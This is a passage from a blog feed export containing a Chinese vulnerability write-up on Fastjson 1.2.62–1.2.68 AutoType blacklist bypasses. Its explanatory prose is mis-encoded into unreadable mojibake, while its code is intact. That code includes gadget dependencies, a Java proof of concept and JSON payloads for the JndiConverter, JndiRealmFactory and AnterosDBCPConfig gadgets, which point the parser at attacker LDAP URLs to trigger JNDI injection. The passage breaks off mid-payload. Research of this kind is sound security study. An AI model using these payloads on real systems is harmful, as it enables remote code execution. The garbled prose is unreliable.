href="https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1yq4y1s7h6/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.62-1.2.68ç»•è¿‡</title>
      <link href="/2023/08/Fastjson1-2-62-1-2-68%E7%BB%95%E8%BF%87/"/>
      <url>/2023/08/Fastjson1-2-62-1-2-68%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="1-2-62æ¼æ´åˆ†æ"><a href="#1-2-62æ¼æ´åˆ†æ" class="headerlink" title="1.2.62æ¼æ´åˆ†æ"></a>1.2.62æ¼æ´åˆ†æ</h2><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦çš„è¿‡ç¨‹å‘ç°æœ‰äº›ä¾èµ–å¯¼å…¥çœŸçš„æ…¢ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æŠŠæ•´ä¸ªpom.xmlè´´å‡ºæ¥å¯ä»¥ä¸€æ¬¡æ€§å¯¼å®Œç®—äº†ï¼Œçœ‹è‡ªå·±é€‰æ‹©</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-io&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-io&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.66</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;kryo&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;je&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">5.0</span><span class="number">.73</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-Core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.6</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;br.com.anteros&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;Anteros-DBCP&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.0</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.ibatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.3</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-core&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.ignite&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;ignite-jta&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.15</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.slf4j&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">2.0</span><span class="number">.7</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-codec&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ•´ä¸ªfastjsonå¤ç°æ‰€éœ€çš„ä¾èµ–äº†</p><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><ul><li>éœ€è¦å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.62ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>ç›®æ ‡æœåŠ¡ç«¯éœ€è¦å­˜åœ¨xbean-reflectåŒ…ï¼›xbean-reflect åŒ…çš„ç‰ˆæœ¬ä¸é™ï¼Œæˆ‘è¿™é‡ŒæŠŠ pom.xml è´´å‡ºæ¥ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>è¿™ä¸ªé“¾å­ä¹Ÿæ˜¯é»‘åå•çš„ç»•è¿‡ï¼Œæ‰€ä»¥è¡¥ä¸å°±ä¸çœ‹äº†ç›´æ¥çœ‹æ¼æ´åŸç†<br>è¿™ä¸ªç‰ˆæœ¬ç»•è¿‡é»‘æ°‘å•åˆ©ç”¨çš„æ˜¯<code>org.apache.xbean.propertyeditor.JndiConverter</code> ç±»çš„ <code>toObjectImpl()</code> å‡½æ•°å­˜åœ¨ JNDI æ³¨å…¥æ¼æ´ï¼Œå¯ç”±å…¶æ„é€ å‡½æ•°å¤„è§¦å‘åˆ©ç”¨ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280019803.png" alt="image-20230828001845029"><br>ä½†æ˜¯<code>toObjectImpl</code>å¹¶ä¸æ˜¯getteræˆ–è€…setteræ–¹æ³•ï¼Œå…¶å®è¿™äº›éƒ½åœ¨å…¶çˆ¶ç±»å®Œæˆåœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨äº†çˆ¶ç±»<code>AbstractConverter</code>çš„æ„é€ å‡½æ•°ï¼Œè€Œåœ¨çˆ¶ç±»ä¸­çš„ä¸€ä¸ªsetteræ–¹æ³•å³<code>setAsText</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>toObject</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020103.png" alt="image-20230828002015008"><br>ç»§ç»­çœ‹<code>toObject</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†<code>toObjectImpl</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020929.png" alt="image-20230828002027786"><br>ç„¶åçœ‹çˆ¶ç±»çš„<code>toObjectImpl</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020442.png" alt="image-20230828002039348"><br>æ˜¯ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œæ„å‘³ç€åªèƒ½åœ¨å…¶å­ç±»ä¸­å®ç°ï¼Œè¿™æ ·å°±è°ƒåˆ°äº†<code>org.apache.xbean.propertyeditor.JndiConverter</code> ç±»çš„ <code>toObjectImpl()</code>æ–¹æ³•<br>æ‰€ä»¥expå¦‚ä¸‹ï¼Œserverç«¯è¿˜æ˜¯ç”¨ä¹‹å‰çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass62</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280020794.png" alt="image-20230828002055319"></p><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>ä¸‹é¢è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œç›´æ¥åœ¨checkAutoTypeå‡½æ•°ä¸‹æ–­ç‚¹æ¥åˆ°è¿™é‡Œçœ‹ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­åˆå¤šäº†ä¸€äº›ä»£ç é€»è¾‘è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹Drunkbabyä½¬çš„ä»£ç è§£é‡Šå§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// é™åˆ¶äº†JSONä¸­@typeæŒ‡å®šçš„ç±»åé•¿åº¦</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å•ç‹¬å¯¹expectClasså‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œè®¾ç½®expectClassFlagçš„å€¼</span></span><br><span class="line"><span class="comment">// å½“ä¸”ä»…å½“expectClasså‚æ•°ä¸ä¸ºç©ºä¸”ä¸ä¸ºObjectã€Serializableã€...ç­‰ç±»ç±»å‹æ—¶expectClassFlagæ‰ä¸ºtrue</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43æ£€æµ‹ï¼Œ&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41æ£€æµ‹ï¼Œ&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42æ£€æµ‹ï¼Œ&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å¯¹ç±»åè¿›è¡ŒHashè®¡ç®—å¹¶æŸ¥æ‰¾è¯¥å€¼æ˜¯å¦åœ¨INTERNAL_WHITELIST_HASHCODESå³å†…éƒ¨ç™½åå•ä¸­ï¼Œè‹¥åœ¨åˆ™internalWhiteä¸ºtrue</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åæ¥åˆ°ä¸‹é¢è¿™é‡Œä¼šè¿›è¡Œä¸€ä¸ªé»‘ç™½åå•æ£€æµ‹ï¼Œè¿™ä¸ªç±»éƒ½ä¸åœ¨æ‰€ä»¥ç»§ç»­å¾€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021877.png" alt="image-20230828002117567"><br>å¾€ä¸‹æ¥åˆ°äº†è¿™é‡Œè¿›è¡Œç±»åŠ è½½<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280021288.png" alt="image-20230828002142023"><br>è·Ÿè¿›å»å‘ç°åœ¨ä¸‹é¢è¿™é‡Œæ‹¿åˆ°äº†JndiConerterç±»è¿”å›äº†clazzå®Œæˆäº†ç±»åŠ è½½<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022741.png" alt="image-20230828002202507"><br>åé¢å°±æ˜¯è°ƒç”¨æ„é€ æ–¹æ³•çš„è¿‡ç¨‹äº†ä¸çœ‹äº†<br>è¿™é‡Œæœªå¼€å¯AutoTypeä¸ºä»€ä¹ˆä¸è¡Œå¯ä»¥å‚è€ƒä¸‹é¢åšå®¢<br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/704/">Fastjsonååºåˆ—åŒ–æ¼æ´(4)â€”1.2.68ç‰ˆæœ¬ â€“ JohnFrodâ€™s Blog</a></p><h2 id="1-2-66æ¼æ´åˆ†æ"><a href="#1-2-66æ¼æ´åˆ†æ" class="headerlink" title="1.2.66æ¼æ´åˆ†æ"></a>1.2.66æ¼æ´åˆ†æ</h2><h3 id="å‰ææ¡ä»¶-1"><a href="#å‰ææ¡ä»¶-1" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><ul><li>å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.66ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreåŒ…ï¼›</li><li>br.com.anteros.dbcp.AnterosDBCPConfig ç±»éœ€è¦ Anteros-Coreå’Œ Anteros-DBCP åŒ…ï¼›</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»éœ€è¦ibatis-sqlmapå’ŒjtaåŒ…ï¼›<br>å¯¼å…¥mavençš„åŒ…å¯ä»¥åœ¨<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>ç›´æ¥æ‰¾</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>æ–°Gadgetç»•è¿‡é»‘åå•é™åˆ¶ã€‚</p><p>1.2.66æ¶‰åŠå¤šæ¡Gadgeté“¾ï¼ŒåŸç†éƒ½æ˜¯å­˜åœ¨JDNIæ³¨å…¥æ¼æ´ã€‚</p><p>org.apache.shiro.realm.jndi.JndiRealmFactoryç±»PoCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022723.png" alt="image-20230828002232239"><br>br.com.anteros.dbcp.AnterosDBCPConfigç±»PoCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">æˆ–&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280022084.png" alt="image-20230828002244637"><br>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfigç±»PoCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span 